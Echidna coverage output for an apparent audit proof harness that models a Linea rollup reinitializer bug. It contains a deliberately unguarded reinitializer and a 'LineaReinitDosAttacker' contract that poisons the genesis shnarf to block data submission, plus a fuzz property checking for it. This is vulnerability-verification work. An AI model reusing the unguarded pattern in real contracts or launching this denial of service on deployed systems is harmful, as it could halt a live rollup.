@@ -1,0 +1,227 @@
+C:/Users/vboxuser/Desktop/Repos/zklibreports/proof_harness/cat2_linea_f1_reinitializer_dos/src/EchidnaLineaF1ReinitializerDosHarness.sol
+  1 |     | // SPDX-License-Identifier: MIT
+  2 |     | pragma solidity 0.8.24;
+  3 |     | 
+  4 |     | import {
+  5 |     |     LineaF1SimpleProxy,
+  6 |     |     LineaRollupLike,
+  7 |     |     LineaReinitDosAttacker,
+  8 |     |     ILineaRollupLike
+  9 |     | } from "./LineaF1ReinitializerDosHarness.sol";
+ 10 |     | 
+ 11 |     | /// @notice Echidna harness for Linea reinitializer DoS.
+ 12 | *   | contract EchidnaLineaF1ReinitializerDosHarness {
+ 13 |     |     LineaF1SimpleProxy public proxy;
+ 14 |     |     ILineaRollupLike public rollup;
+ 15 |     |     LineaReinitDosAttacker public attacker;
+ 16 |     | 
+ 17 | *   |     constructor() {
+ 18 | *   |         LineaRollupLike implementation = new LineaRollupLike();
+ 19 | *   |         proxy = new LineaF1SimpleProxy(address(this));
+ 20 | *   |         proxy.upgradeTo(address(implementation));
+ 21 |     | 
+ 22 | *   |         rollup = ILineaRollupLike(address(proxy));
+ 23 | *   |         rollup.initialize(0, address(this));
+ 24 |     | 
+ 25 | *   |         attacker = new LineaReinitDosAttacker();
+ 26 |     |     }
+ 27 |     | 
+ 28 | *   |     function action_attacker_poison_genesis() public {
+ 29 | *   |         try attacker.poisonGenesis(address(proxy)) {} catch {}
+ 30 |     |     }
+ 31 |     | 
+ 32 |     |     function echidna_genesis_submission_path_remains_valid() public view returns (bool) {
+ 33 |     |         return rollup.canSubmitData(rollup.GENESIS_SHNARF(), 1, 1);
+ 34 |     |     }
+ 35 |     | }
+ 36 |     | 
+ 37 |     | 
+
+C:/Users/vboxuser/Desktop/Repos/zklibreports/proof_harness/cat2_linea_f1_reinitializer_dos/src/LineaF1ReinitializerDosHarness.sol
+   1 |     | // SPDX-License-Identifier: MIT
+   2 |     | pragma solidity 0.8.24;
+   3 |     | 
+   4 |     | interface ILineaRollupLike {
+   5 |     |     function initialize(uint256 initialL2BlockNumber, address operator_) external;
+   6 |     |     function initializeParentShnarfsAndFinalizedState(bytes32[] calldata shnarfs, uint256[] calldata finalBlockNumbers) external;
+   7 |     |     function submitData(bytes32 parentShnarf, uint256 firstBlockInData, uint256 finalBlockInData) external;
+   8 |     |     function canSubmitData(bytes32 parentShnarf, uint256 firstBlockInData, uint256 finalBlockInData) external view returns (bool);
+   9 |     |     function shnarfFinalBlockNumbers(bytes32 shnarf) external view returns (uint256);
+  10 |     |     function currentL2BlockNumber() external view returns (uint256);
+  11 |     |     function GENESIS_SHNARF() external view returns (bytes32);
+  12 |     | }
+  13 |     | 
+  14 |     | /// @notice Minimal transparent proxy used for exploit parity.
+  15 | *   | contract LineaF1SimpleProxy {
+  16 | *   |     bytes32 private constant IMPLEMENTATION_SLOT = bytes32(uint256(keccak256("linea.f1.proxy.implementation")) - 1);
+  17 | *   |     bytes32 private constant ADMIN_SLOT = bytes32(uint256(keccak256("linea.f1.proxy.admin")) - 1);
+  18 |     | 
+  19 |     |     error Unauthorized();
+  20 |     |     error ImplementationNotSet();
+  21 |     | 
+  22 | *   |     constructor(address admin_) {
+  23 | *   |         bytes32 adminSlot = ADMIN_SLOT;
+  24 | *   |         assembly {
+  25 | *   |             sstore(adminSlot, admin_)
+  26 |     |         }
+  27 |     |     }
+  28 |     | 
+  29 | *   |     function admin() public view returns (address admin_) {
+  30 | *   |         bytes32 adminSlot = ADMIN_SLOT;
+  31 | *   |         assembly {
+  32 | *   |             admin_ := sload(adminSlot)
+  33 |     |         }
+  34 |     |     }
+  35 |     | 
+  36 | *   |     function implementation() public view returns (address implementation_) {
+  37 | *   |         bytes32 implementationSlot = IMPLEMENTATION_SLOT;
+  38 | *   |         assembly {
+  39 | *   |             implementation_ := sload(implementationSlot)
+  40 |     |         }
+  41 |     |     }
+  42 |     | 
+  43 | *   |     function upgradeTo(address implementation_) external {
+  44 | *   |         if (msg.sender != admin()) revert Unauthorized();
+  45 | *   |         bytes32 implementationSlot = IMPLEMENTATION_SLOT;
+  46 | *   |         assembly {
+  47 | *   |             sstore(implementationSlot, implementation_)
+  48 |     |         }
+  49 |     |     }
+  50 |     | 
+  51 |     |     fallback() external payable {
+  52 | *   |         _delegate();
+  53 |     |     }
+  54 |     | 
+  55 |     |     receive() external payable {}
+  56 |     | 
+  57 | *   |     function _delegate() internal {
+  58 | *   |         address impl = implementation();
+  59 | *   |         if (impl == address(0)) revert ImplementationNotSet();
+  60 |     |         assembly {
+  61 | *   |             calldatacopy(0, 0, calldatasize())
+  62 | *   |             let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
+  63 | *   |             returndatacopy(0, 0, returndatasize())
+  64 | *   |             switch result
+  65 | *   |             case 0 { revert(0, returndatasize()) }
+  66 | *   |             default { return(0, returndatasize()) }
+  67 |     |         }
+  68 |     |     }
+  69 |     | }
+  70 |     | 
+  71 |     | /// @notice Bug-parity model:
+  72 |     | /// 1) normal initializer sets version=1
+  73 |     | /// 2) external reinitializer(5) has no role guard
+  74 |     | /// 3) submission validity depends on shnarfFinalBlockNumbers[parent] + 1
+  75 | *   | contract LineaRollupLike {
+  76 | *   |     bytes32 internal constant EMPTY_HASH = bytes32(0);
+  77 | *   |     bytes32 public constant GENESIS_SHNARF =
+  78 | *   |         keccak256(
+  79 | *   |             abi.encode(
+  80 |     |                 EMPTY_HASH,
+  81 |     |                 EMPTY_HASH,
+  82 | *   |                 0x072ead6777750dc20232d1cee8dc9a395c2d350df4bbaa5096c6f59b214dcecd,
+  83 |     |                 EMPTY_HASH,
+  84 |     |                 EMPTY_HASH
+  85 |     |             )
+  86 |     |         );
+  87 |     | 
+  88 |     |     mapping(bytes32 shnarf => uint256 finalBlockNumber) public shnarfFinalBlockNumbers;
+  89 |     |     uint256 public currentL2BlockNumber;
+  90 |     |     bytes32 public currentFinalizedState;
+  91 |     |     address public operator;
+  92 |     | 
+  93 |     |     uint8 internal initializedVersion;
+  94 |     | 
+  95 |     |     error AlreadyInitialized();
+  96 |     |     error InvalidLengths();
+  97 |     |     error Unauthorized();
+  98 |     |     error InvalidSubmission();
+  99 |     | 
+ 100 | *   |     constructor() {
+ 101 | *   |         _disableInitializers();
+ 102 |     |     }
+ 103 |     | 
+ 104 |     |     modifier initializer() {
+ 105 | *   |         if (initializedVersion >= 1) revert AlreadyInitialized();
+ 106 | *   |         initializedVersion = 1;
+ 107 |     |         _;
+ 108 |     |     }
+ 109 |     | 
+ 110 |     |     modifier reinitializer(uint8 version) {
+ 111 | *   |         if (initializedVersion >= version) revert AlreadyInitialized();
+ 112 | *   |         initializedVersion = version;
+ 113 |     |         _;
+ 114 |     |     }
+ 115 |     | 
+ 116 | *   |     function _disableInitializers() internal {
+ 117 | *   |         initializedVersion = type(uint8).max;
+ 118 |     |     }
+ 119 |     | 
+ 120 | *   |     function initialize(uint256 initialL2BlockNumber, address operator_) external initializer {
+ 121 | *   |         operator = operator_;
+ 122 | *   |         currentL2BlockNumber = initialL2BlockNumber;
+ 123 | *   |         shnarfFinalBlockNumbers[GENESIS_SHNARF] = initialL2BlockNumber;
+ 124 | *   |         currentFinalizedState = keccak256(abi.encode(initialL2BlockNumber, operator_));
+ 125 |     |     }
+ 126 |     | 
+ 127 |     |     /// @notice Intentionally missing access control (bug parity with LineaRollup).
+ 128 | *   |     function initializeParentShnarfsAndFinalizedState(
+ 129 |     |         bytes32[] calldata shnarfs,
+ 130 |     |         uint256[] calldata finalBlockNumbers
+ 131 | *   |     ) external reinitializer(5) {
+ 132 | *   |         if (shnarfs.length != finalBlockNumbers.length) revert InvalidLengths();
+ 133 | *   |         for (uint256 i; i < shnarfs.length; i++) {
+ 134 | *   |             shnarfFinalBlockNumbers[shnarfs[i]] = finalBlockNumbers[i];
+ 135 |     |         }
+ 136 | *   |         currentFinalizedState = keccak256(abi.encode(currentL2BlockNumber));
+ 137 |     |     }
+ 138 |     | 
+ 139 |     |     function submitData(bytes32 parentShnarf, uint256 firstBlockInData, uint256 finalBlockInData) external {
+ 140 |     |         if (msg.sender != operator) revert Unauthorized();
+ 141 |     |         if (!_isValidSubmission(shnarfFinalBlockNumbers[parentShnarf], currentL2BlockNumber, firstBlockInData, finalBlockInData)) {
+ 142 |     |             revert InvalidSubmission();
+ 143 |     |         }
+ 144 |     |         currentL2BlockNumber = finalBlockInData;
+ 145 |     |     }
+ 146 |     | 
+ 147 |     |     function canSubmitData(
+ 148 |     |         bytes32 parentShnarf,
+ 149 |     |         uint256 firstBlockInData,
+ 150 |     |         uint256 finalBlockInData
+ 151 |     |     ) external view returns (bool) {
+ 152 |     |         return _isValidSubmission(shnarfFinalBlockNumbers[parentShnarf], currentL2BlockNumber, firstBlockInData, finalBlockInData);
+ 153 |     |     }
+ 154 |     | 
+ 155 |     |     function _isValidSubmission(
+ 156 |     |         uint256 parentFinalBlockNumber,
+ 157 |     |         uint256 lastFinalizedBlockNumber,
+ 158 |     |         uint256 firstBlockInData,
+ 159 |     |         uint256 finalBlockInData
+ 160 |     |     ) internal pure returns (bool) {
+ 161 |     |         unchecked {
+ 162 |     |             if (parentFinalBlockNumber + 1 != firstBlockInData) {
+ 163 |     |                 return false;
+ 164 |     |             }
+ 165 |     |         }
+ 166 |     |         if (firstBlockInData <= lastFinalizedBlockNumber) {
+ 167 |     |             return false;
+ 168 |     |         }
+ 169 |     |         if (firstBlockInData > finalBlockInData) {
+ 170 |     |             return false;
+ 171 |     |         }
+ 172 |     |         return true;
+ 173 |     |     }
+ 174 |     | }
+ 175 |     | 
+ 176 | *   | contract LineaReinitDosAttacker {
+ 177 | *   |     function poisonGenesis(address proxy) external {
+ 178 | *   |         bytes32[] memory shnarfs = new bytes32[](1);
+ 179 | *   |         uint256[] memory blocks = new uint256[](1);
+ 180 | *   |         shnarfs[0] = ILineaRollupLike(proxy).GENESIS_SHNARF();
+ 181 | *   |         blocks[0] = type(uint256).max;
+ 182 | *   |         ILineaRollupLike(proxy).initializeParentShnarfsAndFinalizedState(shnarfs, blocks);
+ 183 |     |     }
+ 184 |     | }
+ 185 |     | 
+ 186 |     | 
+
